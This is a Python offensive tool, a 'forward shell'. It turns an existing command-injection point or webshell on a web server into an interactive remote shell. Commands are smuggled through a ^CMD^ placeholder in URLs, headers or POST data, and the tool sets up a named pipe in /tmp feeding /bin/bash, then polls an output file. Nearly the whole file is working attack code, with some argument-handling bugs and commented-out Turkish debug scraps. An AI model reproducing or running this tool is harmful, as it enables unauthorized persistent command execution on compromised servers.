#!/bin/env python3

import requests
import threading
import sys
from base64 import b64encode
import random
import argparse
from time import sleep
import re

class WebShell():
    """
    Webshell that will handle the session
    """
    def __init__(self, url, session, headers, proxies, interval, data, upgrade_shell=False):
        self.session = session
        self.url = url
        self.interval = interval
        self.data = data
        self.proxies = proxies
        self.headers = headers
        self.upgrade_shell = upgrade_shell

        tmp_name = random.randrange(10000,99999)
        input_name = f"/tmp/in_{tmp_name}"
        output_name = f"/tmp/out_{tmp_name}"

        self.input_name = input_name
        self.output_name = output_name

    def sendPayload(self, payload):
        b64str = b64encode(bytes(payload,'utf-8') + b'\n').decode()
        payload = f"/usr/bin/echo '{b64str}' | base64 -d > {self.input_name}"
        
        url = self.url.replace("^CMD^", payload)
        headers = self.headers.replace("^CMD^", payload)
        if self.data:
            data = self.data.replace("^CMD^", payload)
            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
        else:
            r = self.session.get(url, headers=headers, proxies=self.proxies)

    def recvOutput(self):
        payload = f"/usr/bin/cat {self.output_name} && /usr/bin/echo -n '' > {self.output_name}"

        url = self.url.replace("^CMD^", payload)
        headers = self.headers.replace("^CMD^", payload)
        if self.data:
            data = self.data.replace("^CMD^", payload)
            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
        else:
            r = self.session.get(url, headers=headers, proxies=self.proxies)

        return r.text
    
    def createSession(self):
        payload = f"bash -c 'rm {self.input_name};rm {self.output_name}; mkfifo {self.input_name}'"

        url = self.url.replace("^CMD^", payload)
        headers = self.headers.replace("^CMD^", payload)
        if self.data:
            data = self.data.replace("^CMD^", payload)
            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
        else:
            r = self.session.get(url, headers=headers, proxies=self.proxies)

        payload = f"bash -c 'tail -f {input_name} | /bin/bash 2>&1 > {output_name} 2>&1' &"
        
        url = self.url.replace("^CMD^", payload)
        headers = self.headers.replace("^CMD^", payload)
        if self.data:
            data = self.data.replace("^CMD^", payload)
            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
        else:
            r = self.session.get(url, headers=headers, proxies=self.proxies)
        
    def endConnection(self):
        payload = f"bash -c 'rm {self.input_name};rm {self.output_name}'; pkill -f 'tail -f {self.input_name}'"

        url = self.url.replace("^CMD^", payload)
        headers = self.headers.replace("^CMD^", payload)
        if self.data:
            data = self.data.replace("^CMD^", payload)
            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
        else:
            r = self.session.get(url, headers=headers, proxies=self.proxies)

    def listenOutput(self):
        while True:
            print(self.recvOutput(), end="")
            sleep(self.interval)

    def run(self):
        print("[+] Starting session")
        self.createSession()
        if self.upgrade_shell:
            prompt = "cmd> "
        else:
            prompt = ""

        # Listen for output thread
        listen_thread = threading.Thread(target=self.listenOutput)
        listen_thread.start()

        # Main loop
        while True:
            cmd = input(prompt)
            if cmd == "exit":
                self.endConnection()
                break
            self.sendPayload(cmd)
            print(self.recvOutput(), end="")
        
        print("[+] Ending session")
        self.endConnection()
        print("[+] Session ended")



# EDIT THIS
url = ""
#url = "http://localhost:8000/malicious.php"

# Create pipe
tmp_name = random.randrange(10000,99999)
input_name = f"/tmp/in_{tmp_name}"
output_name = f"/tmp/out_{tmp_name}"

def recvOutput():
    payload = f"/usr/bin/cat {output_name} && /usr/bin/echo -n '' > {output_name}"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "pwn3r": payload}
    proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
    r = requests.get(url, headers=headers, proxies=proxies)
    return r.text

def sendPayload(payload):
    b64str = b64encode(bytes(payload,'utf-8') + b'\n').decode()
    payload = f"/usr/bin/echo '{b64str}' | base64 -d > {input_name}"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "pwn3r": payload}
    proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
    r = requests.get(url, headers=headers, proxies=proxies)
    return r.text


def createPipeListen():
    payload = f"bash -c 'rm {input_name};rm {output_name}; mkfifo {input_name}'"
    proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "pwn3r": payload}
    r = requests.get(url, headers=headers, proxies=proxies)
    payload = f"bash -c 'tail -f {input_name} | /bin/bash 2>&1 > {output_name} 2>&1'"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "pwn3r": payload}
    print("hazir")
    r = requests.get(url, headers=headers, proxies=proxies)
    return r.text


def main():
    args = argparser.parse_args()

    url = args.url
    proxy = args.proxy
    data = args.data
    headers = args.headers
    interval = args.interval

    session = requests.Session()

    # TODO : Parse proxy input
    if proxy:
        proxies = {}
        # inputs like http://127.0.0.1:8080 and http:127.0.0.1:8080 are accepted, select ip and port
        if proxy.startswith("http://"):
            proxy = proxy[7:]
            proxies["http"] = proxy
        elif proxy.startswith("https://"):
            proxy = proxy[8:]
            proxies["https"] = proxy
        else:
            # Error
            print("[-] Invalid proxy")
            sys.exit(1)

        session.proxies = proxies

    # Parse headers cmd headers will be added later
    if headers:
        cmd_headers = {}
        headers = headers.split(",")
        for header in headers:
            if not "^CMD^" in header:
                header = header.split(":")
                session.headers[header[0]] = header[1]
            else:
                header = header.split(":")
                cmd_headers[header[0]] = header[1]    

    if interval:
        interval = float(interval)
    else:
        interval = 1

    if args.insecure:
        session.verify = False

    if args.upgrade:
        print("[*] TTY shell not fully implemented yet")

    # Create session
    shell = WebShell(url, session, data, cmd_headers, interval, args.upgrade)

    # Run session
    shell.run()

    """
    init = threading.Thread(target=createPipeListen, args=())
    init.start()
    print("basliye 5 sn")
    sleep(5)

    print("payload gitti")
    sendPayload("id")

    print("bekle 1 sn geliyor")
    sleep(1)
    print(recvOutput())
    print("geldi")

    def lis_th():
        while True:
            txt = recvOutput()
            print(txt, end='')
            sleep(1)

    listenin_th = threading.Thread(target=lis_th, args=())
    listenin_th.start()
    """

    """
    while True:
        inp = input()
        txt = sendPayload(inp)
        print(recvOutput(), end='')
    """

    """
    import cmd

    class Shell(cmd.Cmd):
        
        prompt = ''

        def default(self, line):
            sendPayload(line)
            print(recvOutput(), end='')

    print("cmd zaman")

    Shell().cmdloop()


    print("bitirmek gerek tmp silmek fln")
    """


argparser = argparse.ArgumentParser(description='Forward Shell')
argparser.add_argument('-u', '--url', help='URL to send requests to', required=True)
argparser.add_argument('-x', '--proxy', help='Proxy to use', required=False)
argparser.add_argument('-d', '--data', help='Send POST request', required=False)
argparser.add_argument('-H', '--header', help='Add header to request', required=False)
argparser.add_argument('-t', '--interval', help='Interval to check for new output', required=False)
argparser.add_argument('-k', '--insecure', help='Disable SSL verification', required=False, action='store_true')
argparser.add_argument('--upgrade-tty', help='Upgrade to a full interactive shell', required=False, action='store_true')

if __name__ == "__main__":
    main()
